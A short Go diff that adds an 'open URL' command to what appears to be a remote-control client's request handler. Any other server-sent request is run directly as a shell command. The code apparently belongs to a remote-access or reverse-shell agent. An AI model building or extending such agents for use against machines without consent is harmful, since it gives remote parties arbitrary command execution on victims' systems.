@@ -196,6 +196,19 @@ func (h *Handler) HandleServerRequest() {
 					break
 				}
 
+				//OPEN URL
+				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandOpenURL) &&
+					payload.Request[:len(h.Configuration.CommandHandler.CommandOpenURL)] == h.Configuration.CommandHandler.CommandOpenURL {
+					url := strings.TrimSpace(strings.TrimPrefix(payload.Request, h.Configuration.CommandHandler.CommandOpenURL))
+					err := h.Services.URL.OpenURL(url)
+					if err != nil {
+						response = encode.StringToByte(err.Error())
+						hasErr = true
+						break
+					}
+					break
+				}
+
 				//SHELL
 				response = encode.StringToByte(h.Services.Terminal.Run(payload.Request, h.Configuration.Connection.ContextDeadline))
 			}
